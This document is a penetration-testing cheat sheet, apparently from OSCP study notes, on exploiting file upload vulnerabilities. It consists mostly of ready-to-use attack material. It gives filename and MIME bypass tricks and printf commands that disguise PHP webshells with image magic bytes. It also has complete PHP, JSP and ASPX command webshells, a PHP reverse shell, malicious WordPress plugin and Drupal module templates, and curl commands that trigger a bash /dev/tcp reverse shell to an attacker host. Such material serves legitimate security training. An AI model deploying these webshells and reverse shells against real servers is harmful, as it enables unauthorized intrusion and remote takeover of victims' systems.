# File Upload Vulnerability Exploitation

**Source:** gabb4r/OSCP Notes Integration

## Quick Intro

- Identify upload endpoints
- Bypass file type restrictions
- Achieve RCE through malicious uploads
- Testing framework-specific behaviors

## Finding Upload Endpoints

```bash
# Directory fuzzing for upload paths
ffuf -u http://<IP>/FUZZ -w wordlist.txt -e .php -fc 404

# Common upload directories
/upload/
/uploads/
/files/
/media/
/documents/
/images/
/avatar/
/profile/

# CMS upload paths
WordPress: /wp-content/uploads/
Drupal: /sites/default/files/
Joomla: /images/
```

## Simple Bypass Techniques

### Extension Bypass

```bash
# Double extension
shell.php.jpg
shell.php.txt
shell.jpg.php

# Null byte (older PHP)
shell.php%00.jpg
shell.php\0.jpg

# Alternate extensions
shell.phtml
shell.php3
shell.php4
shell.php5
shell.shtml
shell.phar
shell.inc

# Case variation
shell.PHP
shell.PhP
```

### MIME Type Bypass

```bash
# Upload PHP with image MIME type
curl -F "file=@shell.php;type=image/jpeg" http://<IP>/upload.php

# Polyglot file (valid image + PHP)
# Create with: exiftool or manual binary manipulation
```

### Magic Bytes Injection

```bash
# Add image magic bytes to PHP file
printf '\xFF\xD8\xFF\xE0\n<?php system($_GET["cmd"]); ?>' > shell.php

# PNG magic bytes
printf '\x89\x50\x4E\x47\n<?php system($_GET["cmd"]); ?>' > shell.php

# GIF magic bytes
printf '\x47\x49\x46\x38\x39\x61\n<?php system($_GET["cmd"]); ?>' > shell.php
```

## Exploitation Methods

### PHP Shell Upload

**Simple webshell:**
```php
<?php system($_GET['cmd']); ?>
```

**Reverse shell:**
```php
<?php $sock=fsockopen("<IP>",<PORT>);exec("/bin/bash -i <&3 >&3 2>&3"); ?>
```

### JSP Shell (Java)

```jsp
<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) {
        out.println(line + "<br>");
    }
%>
```

### ASPX Shell (Windows)

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
    string cmd = Request.QueryString["cmd"];
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + cmd;
    p.StartInfo.UseShellExecute = false;
    p.StartInfo.RedirectStandardOutput = true;
    p.Start();
    string output = p.StandardOutput.ReadToEnd();
    Response.Write(output);
%>
```

## Framework-Specific Bypasses

### WordPress Plugin Upload

```bash
# Plugins typically uploaded to wp-content/plugins/
# Create .zip with plugin structure
mkdir malicious-plugin
echo '<?php
/**
 * Plugin Name: Malicious Plugin
 * Description: Test
 * Version: 1.0
 */
system($_GET["cmd"]);
?>' > malicious-plugin/plugin.php

zip -r malicious-plugin.zip malicious-plugin/
# Upload via wp-admin/plugin-install.php
```

### Drupal Module Upload

```bash
# Similar to WordPress - create module structure
# Upload to /sites/all/modules/

# .module file structure:
<?php
function malicious_menu() {
  $items['admin/malicious'] = array(
    'page callback' => 'malicious_callback',
  );
  return $items;
}
function malicious_callback() {
  system($_GET['cmd']);
}
?>
```

## Post-Upload Execution

Once uploaded, access shell:

```bash
# Direct file access
curl http://<IP>/uploads/shell.php?cmd=id

# CMS-specific paths
curl http://<IP>/wp-content/uploads/shell.php?cmd=whoami
curl http://<IP>/sites/default/files/shell.php?cmd=ls

# Reverse shell execution
curl "http://<IP>/uploads/shell.php?cmd=bash%20-i%20>%26%20/dev/tcp/<LHOST>/<LPORT>%200>%261"
```

## Defense Bypass Testing Checklist

- [x] Extension whitelist bypass
- [x] MIME type checking bypass
- [x] File signature (magic bytes) bypass
- [x] Double extension attempt
- [x] Null byte injection
- [x] Case sensitivity variation
- [x] Framework-specific upload paths
- [x] Execution in upload directory

## Related Notes

- [[07-Web-Application/Web-Scanning]] → Finding upload endpoints
- [[07-Web-Application/Directory-Fuzzing]] → Path enumeration
- [[04-Exploitation/Reverse-Shells]] → Shell payloads
